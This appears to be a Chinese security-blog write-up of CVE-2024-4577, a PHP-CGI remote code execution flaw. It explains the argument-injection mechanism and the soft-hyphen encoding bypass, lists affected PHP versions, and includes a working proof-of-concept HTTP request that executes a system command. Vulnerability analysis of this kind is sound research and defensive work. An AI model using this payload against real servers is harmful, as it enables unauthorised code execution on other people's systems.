#  实战-最新PHP-RCE+详细分析(CVE-2024-4577)   
原创 Gatsby  极梦C   2024-06-08 11:16  
  
前言  
  
最新PHP-RCE详细分析(CVE-2024-4577)  
  
是一种对  
CVE-2012-1823的一种绕过  
  
  
不是星标不推送文章了。  
  
师傅也不想吧~  
  
快把  
极梦C设置成星标吧。  
  
  
  
前身  
  
  
最新的php rce是建立在CVE-2012-1823基础上的一次编码绕过，而CVE-2012-1823的成因简单来说就是在CGI模式下，用户请求的querystring被作为了php-cgi的参数传递给php-cgi.exe成功解析执行，造成RCE。  
  
```
php-cgi.exe接收的参数
-c 指定php.ini文件的位置
-n 不要加载php.ini文件
-d 指定配置项
-b 启动fastcgi进程
-s 显示文件源码
-T 执行指定次该文件
-h和-? 显示帮助
-s查看元件源码
```  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/PZCtvaaOQSlMEHnc63sf8ID6bG5b6p08viabSa9FdQx1r2QmgrEFoU7SoSjiaR5ZptZC0RTV5gpdFjdh8rHHQVnw/640?wx_fmt=png&from=appmsg "")  
  
攻击过程  
  
  
urlcode编码中%3D为=,%3A为:  -d allow_url_include=on控制允许在include、include_once、require、require_once等函数中使用URL作为文件名，可以远程url加载执行php代码-d auto_prepend_file=php://inputphp://input流通常用于读取POST数据，而-d auto_prepend_file则指定了包含的php脚本为POST输入  
  
  
所以使用以下payload就使得能够允许文件包含，而文件包含是读入的POST数据流作为脚本.  
  
poc如下：  
  
```
POST /index.php?-d+allow_url_include%3Don+-d+auto_prepend_file%3Dphp%3A//input HTTP/1.1
Host: xxxxx.com
Content-Length: 25

<?php system("whoami");?>
```  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/PZCtvaaOQSlMEHnc63sf8ID6bG5b6p084GCiahuJJnC0Stj9uMUibPexAkUsbInaL9q6CDQYpjI4pDc8AhaBbhtA/640?wx_fmt=png&from=appmsg "")  
  
后面官方修补的补丁中也就是把”-”这个字符给匹配过滤了  
  
而最新版的RCE之所以只会影响繁体中文、简体中文、日文这三个语言版本的windows系统，  
  
就是因为有大神找到了-的编码绕过方式，在我们带入参数拼接前宽字节会被转换，0x00ad显然不是一个完整的字节，而是一部分字节。  
  
  
而在中文GBK编码中正好可以找到一个-来对其进行%ad编码从而绕过  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/PZCtvaaOQSlMEHnc63sf8ID6bG5b6p087tBfME2m27C61WwzSyvxrgnmLYj8ia1bdgD1QprTEAMLYovykmGdg8Q/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/PZCtvaaOQSlMEHnc63sf8ID6bG5b6p08iaCE2mAiblcUiaAPhGYTuFBLXHwkIfyWwtiawehIpIAYQorjpuyAxWPxcQ/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/PZCtvaaOQSlMEHnc63sf8ID6bG5b6p08MjjJLz78dxEibayjWGIKERqduCesX9WmeWibHkespqLAcm9T75nHxuwg/640?wx_fmt=png&from=appmsg "")  
  
实战截图  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/PZCtvaaOQSlMEHnc63sf8ID6bG5b6p08ibiaJuvjXcloGl78cyUmcfibq8T3UnagGJDV50aA4qmRFcZDq7N1nRAAw/640?wx_fmt=png&from=appmsg "")  
  
  
总结  
  
  
1.具有简体中文、繁体中文、日文的Windows系统，支持bestfit936 GBK编码  
  
2.	开发是在CGI(单PHP)环境中，利用条件很苛刻  
  
3.  
PHP局限在一定的版本  
  
  
提醒  
  
  
phpstudy集成中没漏洞版本。  
  
漏洞版本:  
  
        PHP 8.3 < 8.3.8                
  
        PHP 8.2 < 8.2.20            
  
        PHP 8.1 < 8.1.29  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
承接红蓝对抗,安全众测,安全培训,SRC培训,代码审计,渗透测试,  
应急响应,免杀等.  
  
(  
安全可靠,排名稳定,战绩可查.  
)  
  
  
  
  
  
  
  
  
  
  
  
  
**星球内容**  
  
正式运营星球:  
  
1.src真实漏洞挖掘案例分享(永久不定时更新),过程详细一看就会哦。2.自研/二开等工具/平台的分享。3.漏洞分析/资料共享等。  
  
  
  
  
  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/PZCtvaaOQSlX35A5dqqibBHic3oEWTbTpbylJlHkMPgSQMmWjibT53vcuN61Lq9GTnv8jByMm8VwDfkrSicok5ibWZA/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/PZCtvaaOQSlX35A5dqqibBHic3oEWTbTpb32IeKkcDcHPpBowfT8j9icCVPItPaDdNs0liaUqDNLksmhpGpCp3Q05w/640?wx_fmt=png&from=appmsg "")  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/PZCtvaaOQSlX35A5dqqibBHic3oEWTbTpb0oaLpENCfpxATTSY3bILwibIbxiaEcWeExDZ642h345GAQsvhZvmjo0Q/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/PZCtvaaOQSmuqib0x4yT0TT6icYMyR1tLz7alpqZuzwFkLpypdkpMfx2dNNFjkaoPxmEBsGSy1cknnibaR1oKW6mA/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/PZCtvaaOQSmuqib0x4yT0TT6icYMyR1tLzrFXyia2GhKl9L22tStIEIru8aSlso95Md9asCGFGnHdqvVW6H9UXQeQ/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/PZCtvaaOQSmuqib0x4yT0TT6icYMyR1tLzMCrslouPl5wzysOaZ6GIpwfaZ1L0NCFwnwu8lZ6oXIjpresJ3MfQYA/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/PZCtvaaOQSmuqib0x4yT0TT6icYMyR1tLzp18hvAZVuvhwiaYoEBia6nK5HET8ltnnAMHeEKtjlbjSicMQ1GY07J1nQ/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/PZCtvaaOQSmuqib0x4yT0TT6icYMyR1tLzXJtMGdicLibDYnHqp9Dl7Rge4u0PkJKU1EsiceZBbVb97GB4d0LicEj5Lw/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/PZCtvaaOQSmjh5T2BWl7sh6ibOqyW3WJs5iaZkV6fibKHBKBEbLRGibibxAnH0Xib0lV7TEVowYW6cc9lIxdLm40zMiaw/640?wx_fmt=png&from=appmsg "")  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/PZCtvaaOQSmjh5T2BWl7sh6ibOqyW3WJsDawzjlOuS14heZX9Ax3ILJB3l8DLu0aibBrwQoPdZZbo0EGlnTbMOOw/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/PZCtvaaOQSmjh5T2BWl7sh6ibOqyW3WJsyDpZjQm83zhVsbDfbE9hpHfNXJ4HwE4gT9gAWUy6KnabUT5licIUTuA/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/PZCtvaaOQSmjh5T2BWl7sh6ibOqyW3WJs7aU4jAFIicWHNNFE2JYdxp7YgeaOicrjiajBkTJoh04Kn22JNOXe1wAiaw/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/PZCtvaaOQSkapr9ibNichibdQvJRftuppYvBJ59bRw5U7Z7SJrjjJIzrc1hkt0KA0fYwem40ic38QUxSYKUrPtnXnw/640?wx_fmt=png "")  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/PZCtvaaOQSkapr9ibNichibdQvJRftuppYvwgaZYIqtr1sANR78ItvL2WHzevCxgxcMnVVIO1ic9icN0el1sagY8cTg/640?wx_fmt=png "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/PZCtvaaOQSkapr9ibNichibdQvJRftuppYvIEI0c5l4xahhibPpsyeCOxibnPYBlwxp0Ur1qggMicTqjQ0CjYmybqY8w/640?wx_fmt=png "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/PZCtvaaOQSkapr9ibNichibdQvJRftuppYvqa0Ljd3KNKiaiaVRHOVO2J6UMQp7NaATEjA8Offk95pgqU0QoQ5kwYmw/640?wx_fmt=png "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/PZCtvaaOQSl9WoxvpvP82uRH1icibXgibmnxENltLsziaPGpmiaETT88fVsxsP27BeKmSygjlOqP4EiaHibcqF8nxjBHg/640?wx_fmt=png "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/PZCtvaaOQSl9WoxvpvP82uRH1icibXgibmnmIvT9OAicFGJTRFAesAIOlHmjV9n3GEd6p7cLia2PMmx8mOiaBq364QvA/640?wx_fmt=png "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/PZCtvaaOQSl9WoxvpvP82uRH1icibXgibmnicQQBrS8TSFaAEB4Fn0aXe7U1yUTFgAdV2xrlaGgBHCibAknIyPs1vMA/640?wx_fmt=png "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/PZCtvaaOQSl9WoxvpvP82uRH1icibXgibmnial7HAVjwsvE6kJ5kiarSSVsCiczcKYNH3XeZDnDRxziayyGDenaoOKXvg/640?wx_fmt=png "")  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/PZCtvaaOQSlgTbk0KyY4C4MGX2mwfnoFZLA5YgPHPuicRiaMQx5u9W2m714Pib1fhKclZDaHomrffqYWDvd5WJdew/640?wx_fmt=png "")  
  
  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/PZCtvaaOQSlgTbk0KyY4C4MGX2mwfnoFHTKAB5KEEC5RicaErl9j7gicSql43JARkLUd8Oruoxx2Sq8f4osF3JibA/640?wx_fmt=png "")  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/PZCtvaaOQSnr7SlwGhKoiasYiafFqzG1XichI6kcicxRGXc1rOZVjlCePs8ZpKyl6cazYKTUoNhhc76zOsdGlAeIaw/640?wx_fmt=png "")  
  
  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/PZCtvaaOQSnr7SlwGhKoiasYiafFqzG1XicicFcU3cmGric3yjbAtkygkdI4YDkkyvdHD1YGH403f5zVbwrh5Aevkbw/640?wx_fmt=png "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/PZCtvaaOQSnr7SlwGhKoiasYiafFqzG1XicCG2eqITmBTvTibuP9tHxzqpiajO39odva0icdw2S37sbMfZBgRGQVxCQA/640?wx_fmt=png "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/PZCtvaaOQSnr7SlwGhKoiasYiafFqzG1XicibdibfcCYQV0cP5DAUQG2u05S5j5W6KeM8f8sFJia60fxyFBDHExorbZw/640?wx_fmt=png "")  
  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/PZCtvaaOQSliaepxgObwEg6xDKmF21o9ftUibLopE3Xs5Z9Dm52Q7Lox57X1d89mrun3eWyUCKSTXMyYIibUV3lKg/640?wx_fmt=png "")  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/PZCtvaaOQSliaepxgObwEg6xDKmF21o9fv8s8kH1c2Mwhp8MWLprcJxYVPlJU9NvP0FXIo2Z1FaToFseFnhSo5w/640?wx_fmt=png "")  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/PZCtvaaOQSlgibAqLicdJhGfNibkKZuz7LyrXTSCkVF07J5UWcbSTbYDqvre92c64WodqibfEHVjwyUl1hEpJbA5Qw/640?wx_fmt=png "")  
  
  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/PZCtvaaOQSlgibAqLicdJhGfNibkKZuz7LymhLLRcsNtIh7fnAkKbPqT39YtbqGialEDia6MCZko0yhoXeS4EYZvIJQ/640?wx_fmt=png "")  
  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/PZCtvaaOQSlXZLdyZDEnDHIC8NClibLOHfsEbqX5Efd2DtZSrez5b3ib8dRHeiaYOP8eRn3ibDt7ZFE0vIiaGjBhWbw/640?wx_fmt=png "")  
  
  
  
  
  
  
  
  
关于文章/Tools获取方式:请关注交流群或者知识星球。  
  
  
  
  
  
  
  
  
  
  
  
关于交流群：因为某些原因，更改一下交流群的获取方式:  
  
1.请点击  
联系我们->联系官方->客服小助手添加二维码拉群 。    
  
![](https://mmbiz.qpic.cn/mmbiz_png/1kZ9ibb5tl5Cia8Pe5Tln5a1lCBThxiaRvVvH8JJuXhTTsErgic1iasMfD6PWd4XXT4LBvDic60A9GCzEIP8PXo0Kchg/640?wx_fmt=png "")  
  
  
  
  
  
  
  
  
关于知识星球的获取方式:  
  
1.后台回复发送 "  
知识星球"，即可获取知识星球二维码。  
  
2如若上述方式不行，请点击  
联系我们->联系官方  
->客服小助手添加二维码进入星球 。    
  
3.为了提高质量,  
推出"  
免费名人堂"  
名额,  
后台回复发送 "  
知识星球  
"了解详情。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/1kZ9ibb5tl5Cia8Pe5Tln5a1lCBThxiaRvVvH8JJuXhTTsErgic1iasMfD6PWd4XXT4LBvDic60A9GCzEIP8PXo0Kchg/640?wx_fmt=png "")  
  
  
  
  
  
  
  
  
  
  
免责声明  
  
  
          
  
  
本公众号文章以  
技术分享学习为目的。  
  
由于传播、利用本公众号发布文章而造成的任何直接或者间接的后果及损失，均由使用者本人负责，公众号及作者不为此承担任何责任。  
  
一旦造成后果请自行承担！如有侵权烦请告知，我们会立即删除并致歉。谢谢！  
  
  
  
  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/ibZ6uZjjH3v7LQZwTb4qED3KvozKicnJd9ejpVoCntCRqf53IiaK2T3myzcUn5sswkUPfpQj1KHAALFcMFNYjfriaw/640?wx_fmt=gif "")  
  
  
  
  
  
